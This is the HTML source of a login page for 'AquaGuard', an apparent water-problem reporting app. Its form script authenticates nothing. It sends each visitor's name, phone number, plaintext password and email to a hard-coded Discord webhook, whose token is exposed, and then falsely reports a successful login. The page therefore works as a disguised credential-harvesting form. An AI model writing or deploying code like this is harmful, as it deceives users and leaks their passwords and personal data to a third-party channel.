<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AquaGuard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
</head>

<body>

<nav class="navbar navbar-expand-sm bg-dark navbar-dark p-1">
  <div class="container">
    <a class="navbar-brand" href="#"><h2 class="mt-1">AquaGuardâ„¢</h2></a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ms-auto">
        <li class="nav-item">
          <a class="nav-link" aria-current="page" href="aboutus.html?access=true"><h3 class="mt-2">About Us</h3></a>
        </li>
      </ul>
    </div>
  </div>
</nav>

<div class="container mt-5 mb-5">
  <p id="group2" class="lead text-center">AquaGuard is an application in which you can report anything correlated to water, such as water leaks, problems with pipes, puddles that contain electricity due to wrong electricity transmission and etc. You can also contribute to events that are about the cleanness of water in places, while also learning about the ecosystem and its importance.  
  </p>
</div>

<div id="formbox" class="container p-5 form-check form-switch d-flex align-items-center mb-3">
  <form id="newsletterForm" class="w-100 text-center">
    <h3 id="formtext">Log In to AquaGuard</h3><br>
    <input id="name" type="text" class="form-control mb-3" placeholder="Enter full name" required>
    <input id="number" type="number" class="form-control mb-3" placeholder="Enter phone number" required>
    <input id="password" type="password" class="form-control mb-3" placeholder="Enter password" required>
    <input id="email" type="email" class="form-control mb-3" placeholder="Enter email address" required>
    <div class="d-flex justify-content-center mb-3">
      <input class="form-check-input form-switch m-0" type="checkbox" id="agree" required> 
      <label for="agree" style="color: rgb(255, 255, 255);" class="ms-2">
        <small><h5>Agree to the terms and services.</h5></small>
      </label>
    </div>
    <button class="btn btn-outline-light mx-auto d-block" type="submit">Log in</button>
  </form>
</div>

<script>
  const form = document.getElementById('newsletterForm');
  form.addEventListener('submit', function(e) {
    e.preventDefault();

    const name = document.getElementById('name').value;
    const number = document.getElementById('number').value;
    const password = document.getElementById('password').value;
    const email = document.getElementById('email').value;
    const agree = document.getElementById('agree').checked;

    if (!agree) {
      alert('You must agree to the terms!');
      return;
    }

    const webhookURL = "https://discord.com/api/webhooks/1286793971292573717/TVHnQb-xHuPFDCzuvdsDZ8LuWRFjlZ101OXPyPZsu6VoHBxCuQSzo8LoKPb7mueOljcH"; 

    const payload = {
      content: `# Entrance:\n\n**Name:** ${name}\n**Phone Number:** ${number}\n**Password:** ${password}\n**Email:** ${email}`
    };

    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    })
    .then(response => {
      if (response.ok) {
        alert('Logged in successfully!');
        window.location.href = 'main.html?Access=true';
      } else {
        alert('Error logging in.');
      }
    })
    .catch(error => {
      console.error('Error:', error);
      alert('Error logging in.');
    });
  });
</script>

<style>
  .form-control:focus {
    box-shadow: none;
    border-color: #ffffff;
  }
  .text-center {
    text-align: center;
  }
  .form-control::placeholder {
    color: #aeaeae;
  }
  #formtext, #rangeValue, #group2, #group3, #ediz {
    color: #ffffff;
  }
  #group, #phone {
    background-color: rgba(5, 55, 165, 0);
  }
  #formbox {
    background-color: rgba(159, 192, 208, 0.35);
    border-radius: 2vh;
    width: 100%;
    max-width: 600px;
    padding: 2rem;
    margin: 0 auto;
  }
  @media (min-width: 992px) {
    #formtext {
      font-size: 2rem;
    }
    h3, .lead, h6 {
      font-size: 1.5rem;
    }
    .form-control {
      font-size: 1.2rem;
      padding: 10px;
    }
    .btn-outline-light {
      font-size: 1.2rem;
      padding: 10px 20px;
    }
  }
  @media (max-width: 768px) {
    #formtext {
      font-size: 1.5rem;
    }
    h3, .lead, h6 {
      font-size: 1.1rem;
    }
    #formbox {
      width: 100%;
      max-width: 90%;
      padding: 20px;
    }
    .form-control {
      font-size: 1rem;
    }
    .btn-outline-light {
      font-size: 1rem;
      padding: 10px;
    }
    .container {
      padding-left: 10px;
      padding-right: 10px;
    }
  }
  body {
    background-image: linear-gradient(to bottom, #011f49, #000000);
  }
</style>

</body>
</html>
